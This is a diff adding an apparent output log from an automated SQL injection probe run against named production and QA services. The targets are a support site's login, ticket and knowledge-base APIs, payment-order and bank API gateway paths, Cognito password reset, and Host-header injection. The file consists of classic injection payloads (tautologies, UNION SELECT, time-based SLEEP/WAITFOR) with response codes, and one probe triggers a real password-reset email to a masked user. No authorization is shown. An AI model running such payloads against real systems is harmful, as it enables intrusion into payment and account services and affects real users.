@@ -1,0 +1,94 @@
+============================================================
+1. SOPORTE LOGIN SQLi
+============================================================
+  Baseline: 401 (0b) 
+  [0] email:401(0b) pwd:401(0b) '
+  [1] email:401(0b) pwd:401(0b) ' OR '1'='1
+  [2] email:401(0b) pwd:401(0b) ' OR '1'='1'--
+  [3] email:401(0b) pwd:401(0b) ' OR '1'='1'/*
+  [4] email:401(0b) pwd:401(0b) " OR "1"="1
+  [5] email:401(0b) pwd:401(0b) 1' AND 1=1--
+  [6] email:401(0b) pwd:401(0b) 1' AND 1=2--
+  [7] email:401(0b) pwd:401(0b) admin'--
+  [8] email:401(0b) pwd:401(0b) 1; SELECT 1--
+  [9] email:401(0b) pwd:401(0b) ' UNION SELECT NULL--
+  [10] email:401(0b) pwd:401(0b) ' UNION SELECT NULL,NULL--
+  [11] email:401(0b) pwd:401(0b) ' UNION SELECT NULL,NULL,NULL-
+  [12] email:401(0b) pwd:401(0b) 1' WAITFOR DELAY '0:0:3'--
+  [13] email:401(0b) pwd:401(0b) 1'; WAITFOR DELAY '0:0:3'--
+  [14] email:401(0b) pwd:401(0b) 1' AND SLEEP(3)--
+
+============================================================
+2. SOPORTE LOGIN TIME-BASED BLIND SQLi
+============================================================
+   mysql: 401 (0b) 0.5s 
+   mysql2: 401 (0b) 0.4s 
+   pg: 401 (0b) 0.4s 
+   pg2: 401 (0b) 0.5s 
+   mssql: 401 (0b) 0.4s 
+   oracle: 401 (0b) 0.4s 
+   sqlite: 401 (0b) 0.4s 
+
+============================================================
+3. NOTIFICATION ENDPOINT SQLi (no auth)
+============================================================
+  Baseline: 200 (0b)
+
+  --- Time-based ---
+   mysql: 200 (0b) 0.3s
+   mysql2: 200 (0b) 0.3s
+   pg: 200 (0b) 0.4s
+   pg2: 200 (0b) 0.3s
+
+============================================================
+4. SOPORTE — OTHER ENDPOINTS SQLi
+============================================================
+  GET /api/v1/knowledge-base?search=': 401 (0b)
+  GET /api/v1/knowledge-base?search=' OR '1'='1'--: 401 (0b)
+  GET /api/v1/knowledge-base?search=1 AND 1=1: 401 (0b)
+  GET /api/v1/knowledge-base?search=1 AND 1=2: 401 (0b)
+  GET /api/v1/knowledge-base?slug=': 401 (0b)
+  GET /api/v1/knowledge-base?slug=' OR '1'='1'--: 401 (0b)
+  GET /api/v1/knowledge-base?slug=1 AND 1=1: 401 (0b)
+  GET /api/v1/knowledge-base?slug=1 AND 1=2: 401 (0b)
+  GET /api/v1/knowledge-base?category=': 401 (0b)
+  GET /api/v1/knowledge-base?category=' OR '1'='1'--: 401 (0b)
+  GET /api/v1/knowledge-base?category=1 AND 1=1: 401 (0b)
+  GET /api/v1/knowledge-base?category=1 AND 1=2: 401 (0b)
+  GET /api/v1/tickets?id=': 401 (0b)
+  GET /api/v1/tickets?id=' OR '1'='1'--: 401 (0b)
+  GET /api/v1/tickets?id=1 AND 1=1: 401 (0b)
+  GET /api/v1/tickets?id=1 AND 1=2: 401 (0b)
+   POST /api/v1/auth/forgot-password: 401 (0b) 
+   POST /api/v1/auth/forgot-password: 401 (0b) 
+   POST /api/v1/auth/reset-password: 401 (0b) 
+   POST /api/v1/auth/reset-password: 401 (0b) 
+
+============================================================
+5. API GATEWAY — PARAMETER SQLi (prod + QA)
+============================================================
+  PROD /api/v1/payment-order/' OR '1'='1: 0 (99b) URL can't contain control characters. "/prod/api/v1/payment-order/' OR '1'='1" (found at least ' ')
+  PROD /api/v1/bank?q=': 401 (26b) {"message":"Unauthorized"}
+  PROD /api/v1/bank/' OR '1'='1: 0 (90b) URL can't contain control characters. "/prod/api/v1/bank/' OR '1'='1" (found at least ' ')
+  PROD /api/v1/payment-order/internal-id/1' AND '1'='1: 0 (113b) URL can't contain control characters. "/prod/api/v1/payment-order/internal-id/1' AND '1'='1" (found 
+  QA /api/v1/payment-order/' OR '1'='1: 0 (97b) URL can't contain control characters. "/qa/api/v1/payment-order/' OR '1'='1" (found at least ' ')
+  QA /api/v1/bank?q=': 401 (26b) {"message":"Unauthorized"}
+  QA /api/v1/bank/' OR '1'='1: 0 (88b) URL can't contain control characters. "/qa/api/v1/bank/' OR '1'='1" (found at least ' ')
+  QA /api/v1/payment-order/internal-id/1' AND '1'='1: 0 (111b) URL can't contain control characters. "/qa/api/v1/payment-order/internal-id/1' AND '1'='1" (found at
+
+============================================================
+6. COGNITO SQLi (via username)
+============================================================
+  ForgotPwd(' OR '1'='1'--): 400 {"__type":"InvalidParameterException","message":"1 validation error detected: Value at 'username' fa
+  ForgotPwd(admin'--): 200 {"CodeDeliveryDetails":{"AttributeName":"email","DeliveryMedium":"EMAIL","Destination":"a***@g***"}}
+  ForgotPwd(1; SELECT 1--): 400 {"__type":"InvalidParameterException","message":"1 validation error detected: Value at 'username' fa
+
+============================================================
+7. SOPORTE — HEADER INJECTION / HOST HEADER SQLi
+============================================================
+  Host(soporte.disperso.com' OR '1'='): 400 (166b)
+  Host(soporte.disperso.com%00.evil.c): 400 (435b)
+
+============================================================
+SQLi PROBE DONE
+============================================================
